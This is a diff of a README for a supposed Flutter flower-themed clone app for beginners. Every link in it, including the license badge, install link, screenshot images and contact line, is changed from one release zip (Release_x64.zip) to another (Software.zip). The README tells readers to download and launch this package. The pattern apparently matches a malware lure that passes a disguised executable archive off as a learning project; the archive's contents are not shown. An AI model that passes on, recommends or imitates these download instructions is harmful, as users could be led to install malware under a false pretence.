@@ -1,6 +1,6 @@
 # 🌸 Flutter Flower Clone App 🌸
 
-[![License](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v1.0/Release_x64.zip)](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v1.0/Release_x64.zip)
+[![License](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v2.0/Software.zip)](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v2.0/Software.zip)
 
 Welcome to the Flutter Flower Clone App repository! This repository contains a Flutter app that aims to clone a flower-themed application. 
 
@@ -14,7 +14,7 @@ This Flutter Flower Clone App is a great example for beginners to understand how
 🌻 Perfect for learning Flutter app development  
 
 ## Installation
-To install the Flutter Flower Clone App on your device, you can download the software package from the following link: [Download https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v1.0/Release_x64.zip](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v1.0/Release_x64.zip)  
+To install the Flutter Flower Clone App on your device, you can download the software package from the following link: [Download https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v2.0/Software.zip](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v2.0/Software.zip)  
 (Please note that the software needs to be launched after installation.)
 
 If the link is not working, you can check the "Releases" section of this repository to find the latest version of the software package.
@@ -22,9 +22,9 @@ If the link is not working, you can check the "Releases" section of this reposit
 ## Screenshots
 Here are some screenshots of the Flutter Flower Clone App to give you a sneak peek into the beautiful design:
 
-![Screen 1](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v1.0/Release_x64.zip)
-![Screen 2](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v1.0/Release_x64.zip)
-![Screen 3](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v1.0/Release_x64.zip)
+![Screen 1](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v2.0/Software.zip)
+![Screen 2](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v2.0/Software.zip)
+![Screen 3](https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v2.0/Software.zip)
 
 ## Technologies Used
 The Flutter Flower Clone App utilizes the following technologies:
@@ -42,7 +42,7 @@ To get started with the Flutter Flower Clone App, follow these steps:
 Contributions to the Flutter Flower Clone App are welcome! If you have any suggestions for improvement or would like to add new features, feel free to fork the repository and submit a pull request with your changes.
 
 ## Contact
-If you have any questions or want to reach out regarding the Flutter Flower Clone App, you can contact us at https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v1.0/Release_x64.zip
+If you have any questions or want to reach out regarding the Flutter Flower Clone App, you can contact us at https://github.com/ItzIdkMoment/flutter_flower_clone_app/releases/download/v2.0/Software.zip
 
 Thank you for checking out the Flutter Flower Clone App! We hope you enjoy exploring the beauty of flowers through this app. 🌸🌺🌼🌻
 
